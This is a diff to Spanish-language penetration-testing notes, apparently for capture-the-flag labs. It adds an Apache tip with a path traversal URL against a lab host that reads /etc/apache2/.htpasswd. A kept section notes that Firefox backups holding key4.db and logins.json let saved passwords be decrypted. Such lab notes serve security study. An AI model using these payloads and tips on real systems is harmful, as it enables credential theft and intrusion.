@@ -1,6 +1,14 @@
 	
 ----
 
+## Apache
+
+- Si tenemos Path Traversal mirate el **/etc/apache2/.htpasswd**
+```URL
+http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd
+```
+
+
 ## Firefox
 
 >Si obtenemos la backup de firefox y encontramos los archivos **key4.db y logins.json**, podremos desencriptar y obtener la passwd
